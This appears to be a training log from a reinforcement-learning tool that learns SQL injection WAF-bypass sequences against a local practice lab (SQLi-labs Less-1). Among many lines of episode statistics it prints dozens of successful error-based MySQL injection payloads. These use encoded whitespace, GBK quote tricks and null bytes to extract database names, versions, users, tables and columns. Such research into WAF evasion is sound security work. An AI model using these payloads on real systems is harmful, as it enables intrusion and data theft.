@@ -1,0 +1,1808 @@
+/home/neet/.pyenv/versions/3.13.12/lib/python3.13/site-packages/stable_baselines3/common/on_policy_algorithm.py:150: UserWarning: You are trying to run A2C on the GPU, but it is primarily intended to run on the CPU when not using a CNN policy (you are using ActorCriticPolicy which should be a MlpPolicy). See https://github.com/DLR-RM/stable-baselines3/issues/1245 for more info. You can pass `device='cpu'` or `export CUDA_VISIBLE_DEVICES=` to force using the CPU.Note: The model will train, but the GPU utilization will be poor and the training might take longer than on CPU.
+  warnings.warn(
+============================================================
+ SeqSQLi v2 — A2C Training
+ URL         : http://localhost:8080/Less-1/
+ Filter type : none
+ Mode        : online-WAF (dual-signal: union+error)
+ Payload pool: 108 validated from payloads_error_less1.csv
+               (union=0, error=108)
+ Timesteps   : 150000
+ Rollout     : n_steps=5 (synchronous A3C variant)
+ Seed        : 1
+============================================================
+  Ep   10 | SR=0% | Steps=15.0 | R=-45.01
+  Ep   20 | SR=0% | Steps=15.0 | R=-44.83
+  Ep   30 | SR=0% | Steps=15.0 | R=-47.66
+  Ep   40 | SR=0% | Steps=15.0 | R=-46.12
+  Ep   50 | SR=0% | Steps=15.0 | R=-46.31
+  Ep   60 | SR=0% | Steps=15.0 | R=-47.18
+  Ep   70 | SR=0% | Steps=15.0 | R=-44.75
+  Ep   80 | SR=0% | Steps=15.0 | R=-45.61
+  Ep   90 | SR=0% | Steps=15.0 | R=-45.81
+  Ep  100 | SR=0% | Steps=15.0 | R=-45.59
+  Ep  110 | SR=0% | Steps=15.0 | R=-46.99
+  Ep  120 | SR=0% | Steps=15.0 | R=-46.13
+  Ep  130 | SR=0% | Steps=15.0 | R=-46.88
+  Ep  140 | SR=0% | Steps=15.0 | R=-46.00
+  Ep  150 | SR=0% | Steps=15.0 | R=-47.10
+  Ep  160 | SR=0% | Steps=15.0 | R=-46.00
+  Ep  170 | SR=0% | Steps=15.0 | R=-45.32
+  Ep  180 | SR=0% | Steps=15.0 | R=-45.90
+  Ep  190 | SR=0% | Steps=15.0 | R=-45.20
+  Ep  200 | SR=0% | Steps=15.0 | R=-45.92
+  Ep  210 | SR=0% | Steps=15.0 | R=-45.33
+  Ep  220 | SR=0% | Steps=15.0 | R=-46.18
+  Ep  230 | SR=0% | Steps=15.0 | R=-45.57
+  Ep  240 | SR=0% | Steps=15.0 | R=-45.02
+  Ep  250 | SR=0% | Steps=15.0 | R=-44.98
+  Ep  260 | SR=0% | Steps=15.0 | R=-45.94
+  Ep  270 | SR=0% | Steps=15.0 | R=-44.25
+  Ep  280 | SR=0% | Steps=15.0 | R=-45.64
+  Ep  290 | SR=0% | Steps=15.0 | R=-46.19
+  Ep  300 | SR=0% | Steps=15.0 | R=-44.47
+  Ep  310 | SR=0% | Steps=15.0 | R=-45.34
+  [BYPASS] Ep  319 | steps=8 | seq=null_byte -> formfeed -> char_split -> plus_sep -> url_encode -> ver_newline -> hex_to_char -> func_sp_nbsp
+           payload: 1'%0cAND%0cGTID_SUBSET((database%a0()),1);%00  *** NEW SHORTEST ***
+  Ep  320 | SR=10% | Steps=14.3 | R=-41.68
+  Ep  330 | SR=0% | Steps=15.0 | R=-44.96
+  Ep  340 | SR=0% | Steps=15.0 | R=-44.95
+  Ep  350 | SR=0% | Steps=15.0 | R=-44.74
+  Ep  360 | SR=0% | Steps=15.0 | R=-45.15
+  [BYPASS] Ep  370 | steps=5 | seq=func_sp_nbsp -> vtab -> url_encode -> distinct -> null_byte
+           payload: 1'%0bAND%0bGTID_SUBSET((database%a0()),1);%00  *** NEW SHORTEST ***
+  Ep  370 | SR=10% | Steps=14.0 | R=-39.29
+  Ep  380 | SR=0% | Steps=15.0 | R=-45.04
+  Ep  390 | SR=0% | Steps=15.0 | R=-45.94
+  Ep  400 | SR=0% | Steps=15.0 | R=-46.15
+  Ep  410 | SR=0% | Steps=15.0 | R=-45.63
+  Ep  420 | SR=0% | Steps=15.0 | R=-46.32
+  Ep  430 | SR=0% | Steps=15.0 | R=-44.85
+  Ep  440 | SR=0% | Steps=15.0 | R=-45.61
+  Ep  450 | SR=0% | Steps=15.0 | R=-45.47
+  Ep  460 | SR=0% | Steps=15.0 | R=-45.70
+  Ep  470 | SR=0% | Steps=15.0 | R=-46.02
+  Ep  480 | SR=0% | Steps=15.0 | R=-45.33
+  Ep  490 | SR=0% | Steps=15.0 | R=-44.58
+  Ep  500 | SR=0% | Steps=15.0 | R=-46.70
+  Ep  510 | SR=0% | Steps=15.0 | R=-44.92
+  Ep  520 | SR=0% | Steps=15.0 | R=-44.06
+  Ep  530 | SR=0% | Steps=15.0 | R=-44.73
+  Ep  540 | SR=0% | Steps=15.0 | R=-45.21
+  Ep  550 | SR=0% | Steps=15.0 | R=-45.74
+  Ep  560 | SR=0% | Steps=15.0 | R=-45.14
+  Ep  570 | SR=0% | Steps=15.0 | R=-45.71
+  Ep  580 | SR=0% | Steps=15.0 | R=-43.95
+  Ep  590 | SR=0% | Steps=15.0 | R=-45.67
+  Ep  600 | SR=0% | Steps=15.0 | R=-43.79
+  Ep  610 | SR=0% | Steps=15.0 | R=-44.15
+  Ep  620 | SR=0% | Steps=15.0 | R=-44.05
+  Ep  630 | SR=0% | Steps=15.0 | R=-44.92
+  Ep  640 | SR=0% | Steps=15.0 | R=-45.02
+  Ep  650 | SR=0% | Steps=15.0 | R=-45.81
+  Ep  660 | SR=0% | Steps=15.0 | R=-44.06
+  Ep  670 | SR=0% | Steps=15.0 | R=-45.06
+  Ep  680 | SR=0% | Steps=15.0 | R=-44.14
+  Ep  690 | SR=0% | Steps=15.0 | R=-45.56
+  Ep  700 | SR=0% | Steps=15.0 | R=-44.94
+  Ep  710 | SR=0% | Steps=15.0 | R=-45.23
+  Ep  720 | SR=0% | Steps=15.0 | R=-44.30
+  Ep  730 | SR=0% | Steps=15.0 | R=-44.25
+  Ep  740 | SR=0% | Steps=15.0 | R=-45.66
+  Ep  750 | SR=0% | Steps=15.0 | R=-45.35
+  Ep  760 | SR=0% | Steps=15.0 | R=-45.46
+  Ep  770 | SR=0% | Steps=15.0 | R=-43.97
+  Ep  780 | SR=0% | Steps=15.0 | R=-43.78
+  Ep  790 | SR=0% | Steps=15.0 | R=-43.99
+  Ep  800 | SR=0% | Steps=15.0 | R=-44.28
+  Ep  810 | SR=0% | Steps=15.0 | R=-44.65
+  Ep  820 | SR=0% | Steps=15.0 | R=-43.24
+  Ep  830 | SR=0% | Steps=15.0 | R=-44.17
+  Ep  840 | SR=0% | Steps=15.0 | R=-43.80
+  Ep  850 | SR=0% | Steps=15.0 | R=-44.14
+  Ep  860 | SR=0% | Steps=15.0 | R=-44.48
+  Ep  870 | SR=0% | Steps=15.0 | R=-44.58
+  Ep  880 | SR=0% | Steps=15.0 | R=-44.56
+  Ep  890 | SR=0% | Steps=15.0 | R=-45.27
+  Ep  900 | SR=0% | Steps=15.0 | R=-43.97
+  Ep  910 | SR=0% | Steps=15.0 | R=-43.12
+  Ep  920 | SR=0% | Steps=15.0 | R=-44.68
+  Ep  930 | SR=0% | Steps=15.0 | R=-43.48
+  Ep  940 | SR=0% | Steps=15.0 | R=-43.68
+  Ep  950 | SR=0% | Steps=15.0 | R=-44.27
+  Ep  960 | SR=0% | Steps=15.0 | R=-46.10
+  Ep  970 | SR=0% | Steps=15.0 | R=-44.29
+  Ep  980 | SR=0% | Steps=15.0 | R=-45.64
+  Ep  990 | SR=0% | Steps=15.0 | R=-44.47
+  Ep 1000 | SR=0% | Steps=15.0 | R=-44.11
+  Ep 1010 | SR=0% | Steps=15.0 | R=-42.61
+  Ep 1020 | SR=0% | Steps=15.0 | R=-44.89
+  Ep 1030 | SR=0% | Steps=15.0 | R=-44.07
+  Ep 1040 | SR=0% | Steps=15.0 | R=-45.35
+  Ep 1050 | SR=0% | Steps=15.0 | R=-44.80
+  Ep 1060 | SR=0% | Steps=15.0 | R=-45.05
+  Ep 1070 | SR=0% | Steps=15.0 | R=-45.72
+  Ep 1080 | SR=0% | Steps=15.0 | R=-44.95
+  Ep 1090 | SR=0% | Steps=15.0 | R=-43.82
+  Ep 1100 | SR=0% | Steps=15.0 | R=-43.87
+  Ep 1110 | SR=0% | Steps=15.0 | R=-44.65
+  Ep 1120 | SR=0% | Steps=15.0 | R=-44.19
+  Ep 1130 | SR=0% | Steps=15.0 | R=-42.93
+  Ep 1140 | SR=0% | Steps=15.0 | R=-43.69
+  Ep 1150 | SR=0% | Steps=15.0 | R=-42.16
+  Ep 1160 | SR=0% | Steps=15.0 | R=-43.81
+  Ep 1170 | SR=0% | Steps=15.0 | R=-43.66
+  Ep 1180 | SR=0% | Steps=15.0 | R=-44.41
+  Ep 1190 | SR=0% | Steps=15.0 | R=-43.23
+  Ep 1200 | SR=0% | Steps=15.0 | R=-43.23
+  Ep 1210 | SR=0% | Steps=15.0 | R=-44.32
+  Ep 1220 | SR=0% | Steps=15.0 | R=-43.61
+  Ep 1230 | SR=0% | Steps=15.0 | R=-43.41
+  [BYPASS] Ep 1236 | steps=14 | seq=crlf -> gbk_bypass -> plus_sep -> case -> unhex_wrap -> vtab -> null_byte -> case -> url_mid_char -> case -> comment -> distinct -> url_mid_char -> agg_swap
+           payload: 1%bf%27%0d%0aAnd%0d%0aEXP(~(selecT%0d%0a*%0d%0afROm%0d%0a(selECT%0d%0a((seLect%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFrom%0d%0aInFormaTIon_scHEMa.schem
+  Ep 1240 | SR=10% | Steps=14.9 | R=-42.20
+  Ep 1250 | SR=0% | Steps=15.0 | R=-43.79
+  [BYPASS] Ep 1257 | steps=6 | seq=ver_12345 -> agg_swap -> null_byte -> agg_swap -> vtab -> case
+           payload: 1'%0band%0bEXP(~(SelEcT%0b*%0bFrom%0b(sElEct%0b((sEleCT%0bJSON_ARRAYAGG(schema_name)%0bFrOM%0bINFORMAtion_SChEma.schemata)))a));%00
+  Ep 1260 | SR=10% | Steps=14.1 | R=-38.10
+  Ep 1270 | SR=0% | Steps=15.0 | R=-43.71
+  Ep 1280 | SR=0% | Steps=15.0 | R=-42.98
+  [BYPASS] Ep 1284 | steps=11 | seq=gbk_bypass -> vtab -> case -> vtab -> vtab -> agg_swap -> case -> hex_to_char -> func_sp_nbsp -> func_sp_cmt -> null_byte
+           payload: 1%bf%27%0band%0bEXP(~(SeLect%0b*%0bFRom%0b(SeLeCt%0b(version%a0()))a));%00
+  Ep 1290 | SR=10% | Steps=14.6 | R=-41.34
+  Ep 1300 | SR=0% | Steps=15.0 | R=-42.16
+  Ep 1310 | SR=0% | Steps=15.0 | R=-41.87
+  Ep 1320 | SR=0% | Steps=15.0 | R=-42.64
+  Ep 1330 | SR=0% | Steps=15.0 | R=-42.76
+  Ep 1340 | SR=0% | Steps=15.0 | R=-42.26
+  Ep 1350 | SR=0% | Steps=15.0 | R=-42.53
+  Ep 1360 | SR=0% | Steps=15.0 | R=-42.07
+  Ep 1370 | SR=0% | Steps=15.0 | R=-41.76
+  Ep 1380 | SR=0% | Steps=15.0 | R=-41.20
+  Ep 1390 | SR=0% | Steps=15.0 | R=-42.23
+  Ep 1400 | SR=0% | Steps=15.0 | R=-40.64
+  Ep 1410 | SR=0% | Steps=15.0 | R=-42.38
+  Ep 1420 | SR=0% | Steps=15.0 | R=-42.95
+  Ep 1430 | SR=0% | Steps=15.0 | R=-42.55
+  Ep 1440 | SR=0% | Steps=15.0 | R=-42.13
+  [BYPASS] Ep 1446 | steps=11 | seq=agg_swap -> agg_swap -> case -> case -> dot_prefix -> agg_swap -> crlf -> nested_union -> hex_to_char -> ver_12345 -> null_byte
+           payload: .11'%0d%0aaNd%0d%0aEXP(~(sELeCt%0d%0a*%0d%0aFrOm%0d%0a(selEcT%0d%0a((sELEcT%0d%0aJSON_ARRAYAGG(CONcaT(tABLE_schema,CHAR(46),table_name))%0d%0afRom%0d%
+  Ep 1450 | SR=10% | Steps=14.6 | R=-37.55
+  Ep 1460 | SR=0% | Steps=15.0 | R=-43.50
+  [BYPASS] Ep 1462 | steps=12 | seq=dot_prefix -> null_byte -> case -> hex_to_char -> null_byte -> double_and -> nested_union -> null_byte -> agg_swap -> char_split -> vtab -> func_sp_nbsp
+           payload: .11'%0banD%0bGTID_SUBSET((version%a0()),1);%00
+  Ep 1470 | SR=10% | Steps=14.7 | R=-40.67
+  Ep 1480 | SR=0% | Steps=15.0 | R=-42.99
+  Ep 1490 | SR=0% | Steps=15.0 | R=-41.60
+  Ep 1500 | SR=0% | Steps=15.0 | R=-41.77
+  Ep 1510 | SR=0% | Steps=15.0 | R=-40.56
+  Ep 1520 | SR=0% | Steps=15.0 | R=-40.82
+  Ep 1530 | SR=0% | Steps=15.0 | R=-41.73
+  Ep 1540 | SR=0% | Steps=15.0 | R=-42.01
+  [BYPASS] Ep 1546 | steps=9 | seq=vtab -> agg_swap -> case -> hex_to_char -> case_split -> case -> case -> case -> null_byte
+           payload: 1'%0banD%0bEXP(~(seLEct%0b*%0bfRoM%0b(sELeCT%0b((sEleCt%0bJSON_ARRAYAGG(schema_name)%0bFrOM%0bInfORmATIon_SCheMa.schemata)))a));%00
+  Ep 1550 | SR=10% | Steps=14.4 | R=-37.37
+  Ep 1560 | SR=0% | Steps=15.0 | R=-41.73
+  Ep 1570 | SR=0% | Steps=15.0 | R=-43.09
+  Ep 1580 | SR=0% | Steps=15.0 | R=-42.14
+  Ep 1590 | SR=0% | Steps=15.0 | R=-42.36
+  Ep 1600 | SR=0% | Steps=15.0 | R=-42.30
+  Ep 1610 | SR=0% | Steps=15.0 | R=-42.68
+  [BYPASS] Ep 1613 | steps=6 | seq=null_byte -> null_byte -> newline -> case -> case_split -> func_sp_nbsp
+           payload: 1'%0aAND%0aEXP(~(selECT%0a*%0aFRom%0a(SEleCt%0a(daTaBase%a0()))a));%00
+  Ep 1620 | SR=10% | Steps=14.1 | R=-38.28
+  Ep 1630 | SR=0% | Steps=15.0 | R=-42.26
+  Ep 1640 | SR=0% | Steps=15.0 | R=-39.12
+  Ep 1650 | SR=0% | Steps=15.0 | R=-42.52
+  Ep 1660 | SR=0% | Steps=15.0 | R=-41.80
+  Ep 1670 | SR=0% | Steps=15.0 | R=-42.24
+  Ep 1680 | SR=0% | Steps=15.0 | R=-42.18
+  Ep 1690 | SR=0% | Steps=15.0 | R=-42.29
+  Ep 1700 | SR=0% | Steps=15.0 | R=-41.93
+  Ep 1710 | SR=0% | Steps=15.0 | R=-42.86
+  Ep 1720 | SR=0% | Steps=15.0 | R=-40.73
+  Ep 1730 | SR=0% | Steps=15.0 | R=-40.50
+  Ep 1740 | SR=0% | Steps=15.0 | R=-40.38
+  Ep 1750 | SR=0% | Steps=15.0 | R=-40.72
+  [BYPASS] Ep 1760 | steps=13 | seq=func_sp_nbsp -> hex_to_char -> case -> null_byte -> case -> agg_swap -> null_byte -> case -> hex_to_char -> func_sp_lit -> hash_nl -> null_byte -> crlf
+           payload: 1'%0d%0aANd%0d%0aEXP(~(sELEcT%0d%0a*%0d%0afroM%0d%0a(SEleCt%0d%0a((SELEct%0d%0aJSON_ARRAYAGG(CONcAT(TAbLE_schema,CHAR(46),TablE_name))%0d%0afrOm%0d%0a
+  Ep 1760 | SR=10% | Steps=14.8 | R=-38.03
+  Ep 1770 | SR=0% | Steps=15.0 | R=-39.86
+  Ep 1780 | SR=0% | Steps=15.0 | R=-39.11
+  Ep 1790 | SR=0% | Steps=15.0 | R=-38.52
+  Ep 1800 | SR=0% | Steps=15.0 | R=-39.75
+  Ep 1810 | SR=0% | Steps=15.0 | R=-38.53
+  Ep 1820 | SR=0% | Steps=15.0 | R=-39.54
+  Ep 1830 | SR=0% | Steps=15.0 | R=-39.54
+  [BYPASS] Ep 1836 | steps=10 | seq=gbk_bypass -> case -> func_sp_nbsp -> case -> case -> null_byte -> case -> case -> case -> newline
+           payload: 1%bf%27%0aANd%0aEXP(~(SeLECt%0a*%0afrOM%0a(SElect%0a(user%a0()))a));%00
+  Ep 1840 | SR=10% | Steps=14.5 | R=-36.05
+  Ep 1850 | SR=0% | Steps=15.0 | R=-39.17
+  Ep 1860 | SR=0% | Steps=15.0 | R=-40.64
+  Ep 1870 | SR=0% | Steps=15.0 | R=-39.62
+  Ep 1880 | SR=0% | Steps=15.0 | R=-38.95
+  Ep 1890 | SR=0% | Steps=15.0 | R=-40.83
+  Ep 1900 | SR=0% | Steps=15.0 | R=-38.58
+  Ep 1910 | SR=0% | Steps=15.0 | R=-39.55
+  [BYPASS] Ep 1918 | steps=7 | seq=case -> null_byte -> case -> case -> crlf -> crlf -> agg_swap
+           payload: 1'%0d%0aAnD%0d%0aEXP(~(sElECt%0d%0a*%0d%0afRom%0d%0a(selECt%0d%0a((seleCT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afRom%0d%0aiNFOrMaTIOn_ScHEMa.schemata))
+  Ep 1920 | SR=10% | Steps=14.2 | R=-34.19
+  Ep 1930 | SR=0% | Steps=15.0 | R=-40.04
+  Ep 1940 | SR=0% | Steps=15.0 | R=-39.71
+  [BYPASS] Ep 1947 | steps=14 | seq=gbk_bypass -> case -> func_sp_tab -> case_split -> case -> case -> crlf -> case -> case -> func_sp_cmt -> null_byte -> func_sp_tab -> case -> agg_swap
+           payload: 1%bf%27%0d%0aaND%0d%0aEXP(~(SelecT%0d%0a*%0d%0afRom%0d%0a(sEleCT%0d%0a((sELect%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFroM%0d%0aINForMATiON_SCheMA.schem
+  Ep 1950 | SR=10% | Steps=14.9 | R=-37.01
+  Ep 1960 | SR=0% | Steps=15.0 | R=-38.53
+  Ep 1970 | SR=0% | Steps=15.0 | R=-38.44
+  Ep 1980 | SR=0% | Steps=15.0 | R=-37.32
+  Ep 1990 | SR=0% | Steps=15.0 | R=-38.53
+  Ep 2000 | SR=0% | Steps=15.0 | R=-38.09
+  [BYPASS] Ep 2009 | steps=10 | seq=case -> case -> null_byte -> func_sp_tab -> case -> agg_swap -> case -> null_byte -> case -> crlf
+           payload: 1'%0d%0aand%0d%0aEXP(~(SElECt%0d%0a*%0d%0aFROm%0d%0a(selECT%0d%0a((sELeCt%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFRom%0d%0aINFORmATION_schema.schemata))
+  Ep 2010 | SR=10% | Steps=14.5 | R=-35.10
+  Ep 2020 | SR=0% | Steps=15.0 | R=-39.38
+  [BYPASS] Ep 2030 | steps=14 | seq=case -> hex_to_char -> case -> hex_to_char -> case -> crlf -> case -> case -> case -> case -> case -> func_sp_tab -> agg_swap -> null_byte
+           payload: 1'%0d%0aAND%0d%0aEXP(~(SELeCT%0d%0a*%0d%0aFrom%0d%0a(sElecT%0d%0a((SeLect%0d%0aJSON_ARRAYAGG(CONCAT(TABLE_schema,CHAR(46),table_name))%0d%0afROm%0d%0a
+  Ep 2030 | SR=10% | Steps=14.9 | R=-36.64
+  [BYPASS] Ep 2039 | steps=5 | seq=case -> crlf -> case -> null_byte -> agg_swap
+           payload: 1'%0d%0aanD%0d%0aEXP(~(sElEct%0d%0a*%0d%0aFRoM%0d%0a(sElecT%0d%0a((sELeCt%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFrOM%0d%0aInfOrMAtiON_ScHEma.schemata))
+  Ep 2040 | SR=10% | Steps=14.0 | R=-34.16
+  Ep 2050 | SR=0% | Steps=15.0 | R=-39.05
+  Ep 2060 | SR=0% | Steps=15.0 | R=-39.05
+  [BYPASS] Ep 2065 | steps=9 | seq=case_split -> null_byte -> case -> dot_prefix -> crlf -> case -> crlf -> case -> func_sp_nbsp
+           payload: .11'%0d%0aAnD%0d%0aGTID_SUBSET((DATAbase%a0()),1);%00
+  Ep 2070 | SR=10% | Steps=14.4 | R=-35.43
+  Ep 2080 | SR=0% | Steps=15.0 | R=-38.20
+  Ep 2090 | SR=0% | Steps=15.0 | R=-37.18
+  Ep 2100 | SR=0% | Steps=15.0 | R=-38.25
+  Ep 2110 | SR=0% | Steps=15.0 | R=-38.08
+  Ep 2120 | SR=0% | Steps=15.0 | R=-39.05
+  Ep 2130 | SR=0% | Steps=15.0 | R=-38.88
+  Ep 2140 | SR=0% | Steps=15.0 | R=-37.64
+  Ep 2150 | SR=0% | Steps=15.0 | R=-38.82
+  Ep 2160 | SR=0% | Steps=15.0 | R=-38.51
+  [BYPASS] Ep 2167 | steps=10 | seq=case -> null_byte -> case -> case -> case -> case -> agg_swap -> case -> case -> crlf
+           payload: 1'%0d%0aANd%0d%0aEXP(~(SElECT%0d%0a*%0d%0afRom%0d%0a(SeleCt%0d%0a((sELeCt%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFrOM%0d%0aINformaTIOn_SchEmA.schemata))
+  Ep 2170 | SR=10% | Steps=14.5 | R=-34.58
+  [BYPASS] Ep 2174 | steps=4 | seq=case -> func_sp_nbsp -> crlf -> null_byte
+           payload: 1'%0d%0aaNd%0d%0aGTID_SUBSET((version%a0()),1);%00  *** NEW SHORTEST ***
+  [BYPASS] Ep 2180 | steps=12 | seq=null_byte -> case -> case -> hex_to_char -> case -> case -> null_byte -> case -> case -> agg_swap -> null_byte -> newline
+           payload: 1'%0aAnD%0aEXP(~(SeleCT%0a*%0aFRoM%0a(selECt%0a((SElECt%0aJSON_ARRAYAGG(CONCAT(tabLE_schema,CHAR(46),tablE_name))%0afrom%0aInforMaTIoN_ScheMa.taBlEs%0
+  Ep 2180 | SR=20% | Steps=13.6 | R=-31.27
+  [BYPASS] Ep 2186 | steps=4 | seq=crlf -> func_sp_nbsp -> null_byte -> case
+           payload: 1'%0d%0aANd%0d%0aEXP(~(seLECT%0d%0a*%0d%0aFRoM%0d%0a(sEleCT%0d%0a(dATaBase%a0()))a));%00
+  Ep 2190 | SR=10% | Steps=13.9 | R=-34.74
+  Ep 2200 | SR=0% | Steps=15.0 | R=-40.85
+  Ep 2210 | SR=0% | Steps=15.0 | R=-38.18
+  Ep 2220 | SR=0% | Steps=15.0 | R=-38.16
+  Ep 2230 | SR=0% | Steps=15.0 | R=-38.05
+  Ep 2240 | SR=0% | Steps=15.0 | R=-39.96
+  Ep 2250 | SR=0% | Steps=15.0 | R=-40.34
+  Ep 2260 | SR=0% | Steps=15.0 | R=-38.97
+  Ep 2270 | SR=0% | Steps=15.0 | R=-39.55
+  Ep 2280 | SR=0% | Steps=15.0 | R=-38.80
+  Ep 2290 | SR=0% | Steps=15.0 | R=-39.07
+  Ep 2300 | SR=0% | Steps=15.0 | R=-38.30
+  Ep 2310 | SR=0% | Steps=15.0 | R=-37.77
+  Ep 2320 | SR=0% | Steps=15.0 | R=-39.58
+  Ep 2330 | SR=0% | Steps=15.0 | R=-40.45
+  Ep 2340 | SR=0% | Steps=15.0 | R=-39.36
+  [BYPASS] Ep 2349 | steps=11 | seq=case -> case -> case -> case -> case -> func_sp_tab -> agg_swap -> case -> agg_swap -> crlf -> null_byte
+           payload: 1'%0d%0aANd%0d%0aEXP(~(SeLEct%0d%0a*%0d%0afROm%0d%0a(SeleCt%0d%0a((SELeCT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFrOm%0d%0aiNfORmaTIon_sCHEmA.schemata))
+  Ep 2350 | SR=10% | Steps=14.6 | R=-35.44
+  Ep 2360 | SR=0% | Steps=15.0 | R=-40.21
+  Ep 2370 | SR=0% | Steps=15.0 | R=-40.11
+  [BYPASS] Ep 2371 | steps=10 | seq=null_byte -> crlf -> func_sp_tab -> case -> case -> formfeed -> hex_to_char -> case -> crlf -> agg_swap
+           payload: 1'%0d%0aaND%0d%0aEXP(~(seLeCt%0d%0a*%0d%0aFROm%0d%0a(SeLeCt%0d%0a((SeLECT%0d%0aJSON_ARRAYAGG(CONCAT(taBLE_schema,CHAR(46),tAbLE_name))%0d%0afrom%0d%0a
+  Ep 2380 | SR=10% | Steps=14.5 | R=-37.60
+  [BYPASS] Ep 2389 | steps=14 | seq=case -> null_byte -> case -> hex_to_char -> crlf -> hex_to_char -> case -> null_byte -> case -> func_sp_tab -> null_byte -> hash_nl -> formfeed -> agg_swap
+           payload: 1'%0d%0aAnD%0d%0aEXP(~(SelEcT%0d%0a*%0d%0afroM%0d%0a(SelECt%0d%0a((SElECt%0d%0aJSON_ARRAYAGG(CONCAT(tABLE_schema,CHAR(46),tABLE_name))%0d%0afrom%0d%0a
+  Ep 2390 | SR=10% | Steps=14.9 | R=-39.21
+  Ep 2400 | SR=0% | Steps=15.0 | R=-39.00
+  [BYPASS] Ep 2408 | steps=10 | seq=case -> case -> case -> formfeed -> case -> agg_swap -> hex_to_char -> hex_to_char -> null_byte -> func_sp_nbsp
+           payload: 1'%0cAnD%0cGTID_SUBSET((user%a0()),1);%00
+  Ep 2410 | SR=10% | Steps=14.5 | R=-37.95
+  Ep 2420 | SR=0% | Steps=15.0 | R=-39.94
+  Ep 2430 | SR=0% | Steps=15.0 | R=-38.38
+  Ep 2440 | SR=0% | Steps=15.0 | R=-38.74
+  Ep 2450 | SR=0% | Steps=15.0 | R=-39.37
+  Ep 2460 | SR=0% | Steps=15.0 | R=-37.93
+  Ep 2470 | SR=0% | Steps=15.0 | R=-38.26
+  [BYPASS] Ep 2474 | steps=9 | seq=formfeed -> case -> case -> hex_to_char -> case -> null_byte -> case -> case -> agg_swap
+           payload: 1'%0canD%0cEXP(~(seleCT%0c*%0cFrOM%0c(seLECt%0c((SELEct%0cJSON_ARRAYAGG(CONCAT(TAblE_schema,CHAR(46),TAbLe_name))%0cfroM%0cInFOrmATION_sCHEMa.tAblEs%0
+  Ep 2480 | SR=10% | Steps=14.4 | R=-34.90
+  Ep 2490 | SR=0% | Steps=15.0 | R=-38.78
+  [BYPASS] Ep 2493 | steps=13 | seq=case -> convert_charset -> case -> null_byte -> case -> hex_to_char -> case -> null_byte -> agg_swap -> formfeed -> case -> case -> func_sp_nbsp
+           payload: 1'%0cAND%0cEXP(~(seLEct%0c*%0cfRoM%0c(SEleCt%0c(version%a0()))a));%00
+  Ep 2500 | SR=10% | Steps=14.8 | R=-36.84
+  Ep 2510 | SR=0% | Steps=15.0 | R=-38.08
+  [BYPASS] Ep 2515 | steps=13 | seq=null_byte -> agg_swap -> case -> null_byte -> crlf -> case -> case -> case -> case -> agg_swap -> case -> case -> func_sp_nbsp
+           payload: 1'%0d%0aaND%0d%0aEXP(~(SELEct%0d%0a*%0d%0afroM%0d%0a(sElEct%0d%0a((SEleCt%0d%0aJSON_ARRAYAGG(column_name)%0d%0aFrOM%0d%0aInfoRMaTiOn_SCheMA.columns%0d
+  [BYPASS] Ep 2517 | steps=13 | seq=case -> hex_to_char -> double_or -> case -> agg_swap -> case -> null_byte -> case -> case -> case -> ver_urlenc -> agg_swap -> crlf
+           payload: 1'%0d%0aaNd%0d%0aEXP(~(SEleCT%0d%0a*%0d%0aFRom%0d%0a(SeleCT%0d%0a((seleCt%0d%0aJSON_ARRAYAGG(coNCAt(TablE_schema,CHAR(46),taBlE_name))%0d%0aFROm%0d%0a
+  Ep 2520 | SR=20% | Steps=14.6 | R=-34.31
+  Ep 2530 | SR=0% | Steps=15.0 | R=-38.57
+  [BYPASS] Ep 2531 | steps=13 | seq=case -> case -> crlf -> case -> case -> null_byte -> case -> case -> agg_swap -> between_space -> case -> case -> hex_to_char
+           payload: 1'%0d%0aAnD%0d%0aEXP(~(SeLEcT%0d%0a*%0d%0afROM%0d%0a(selEcT%0d%0a((selECT%0d%0aJSON_ARRAYAGG(COncAt(TAbLE_schema,CHAR(46),TaBle_name))%0d%0aFROM%0d%0a
+  Ep 2540 | SR=10% | Steps=14.8 | R=-36.72
+  Ep 2550 | SR=0% | Steps=15.0 | R=-39.86
+  Ep 2560 | SR=0% | Steps=15.0 | R=-38.68
+  Ep 2570 | SR=0% | Steps=15.0 | R=-38.56
+  Ep 2580 | SR=0% | Steps=15.0 | R=-37.73
+  Ep 2590 | SR=0% | Steps=15.0 | R=-38.58
+  Ep 2600 | SR=0% | Steps=15.0 | R=-39.88
+  Ep 2610 | SR=0% | Steps=15.0 | R=-37.87
+  [BYPASS] Ep 2617 | steps=8 | seq=case -> case -> null_byte -> case -> case -> case -> func_sp_nbsp -> crlf
+           payload: 1'%0d%0aANd%0d%0aGTID_SUBSET((DaTABASE%a0()),1);%00
+  Ep 2620 | SR=10% | Steps=14.3 | R=-34.84
+  Ep 2630 | SR=0% | Steps=15.0 | R=-38.73
+  Ep 2640 | SR=0% | Steps=15.0 | R=-37.15
+  [BYPASS] Ep 2644 | steps=10 | seq=null_byte -> crlf -> case -> case -> case -> case -> nested_union -> case -> hex_to_char -> agg_swap
+           payload: 1'%0d%0aaNd%0d%0aEXP(~(SEleCt%0d%0a*%0d%0aFrOm%0d%0a(SELeCT%0d%0a((seleCt%0d%0aJSON_ARRAYAGG(CONCAT(tAble_schema,CHAR(46),taBlE_name))%0d%0afrOM%0d%0a
+  Ep 2650 | SR=10% | Steps=14.5 | R=-34.24
+  [BYPASS] Ep 2657 | steps=11 | seq=null_byte -> case -> case -> null_byte -> case -> func_sp_nbsp -> null_byte -> agg_swap -> case -> case -> formfeed
+           payload: 1'%0cAnd%0cEXP(~(seleCt%0c*%0cfRoM%0c(SeLECT%0c((sElECt%0cJSON_ARRAYAGG(column_name)%0cfROM%0cInFOrmATioN_scHema.columns%0cwHeRe%0ctAblE_schema=DaTABA
+  Ep 2660 | SR=10% | Steps=14.6 | R=-36.43
+  [BYPASS] Ep 2669 | steps=8 | seq=case -> null_byte -> case -> dbl_url_comment -> case -> between_space -> hex_to_char -> func_sp_nbsp
+           payload: 1'%a0ANd%a0GTID_SUBSET((version%a0()),1);%00
+  Ep 2670 | SR=10% | Steps=14.3 | R=-36.05
+  Ep 2680 | SR=0% | Steps=15.0 | R=-39.46
